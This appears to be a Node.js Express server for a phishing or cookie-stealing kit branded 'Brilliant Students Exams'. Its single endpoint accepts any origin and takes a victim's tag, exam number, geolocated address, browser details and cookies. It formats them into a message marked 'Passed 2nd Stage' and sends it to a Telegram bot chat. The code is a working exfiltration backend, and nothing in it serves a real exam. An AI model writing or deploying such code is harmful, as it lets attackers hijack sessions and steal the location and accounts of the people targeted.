const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN; // Set in deployment env vars
const CHAT_ID = process.env.CHAT_ID;     // Set in deployment env vars

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('Error: BOT_TOKEN and CHAT_ID must be set as environment variables');
  process.exit(1);
}

app.post('/send-message', async (req, res) => {
  const { userTag, examNumber, geoInfo, browserInfo, cookies } = req.body;

  if (!userTag || !examNumber || !geoInfo || !browserInfo || !cookies) {
    return res.status(400).json({ error: 'Missing required fields in request body' });
  }

  const message =
    `📘 *Brilliant Students Exams*\n` +
    `🏷️ Tag: ${userTag}\n` +
    `📨 Exam Number: ${examNumber}\n` +
    `🌍 Country: ${geoInfo.country}\n` +
    `📍 Address: ${geoInfo.address}\n` +
    `⏰ Timezone: ${geoInfo.timezone}\n` +
    `🖥️ Browser: ${browserInfo.name} v${browserInfo.version}\n` +
    `🍪 Cookies: ${cookies}\n` +
    `✔️ Passed 2nd Stage`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        }),
      }
    );

    const data = await response.json();

    if (data.ok) {
      return res.json({ success: true });
    } else {
      return res.status(500).json({ error: 'Telegram API error', details: data });
    }
  } catch (err) {
    return res.status(500).json({ error: 'Fetch error', details: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
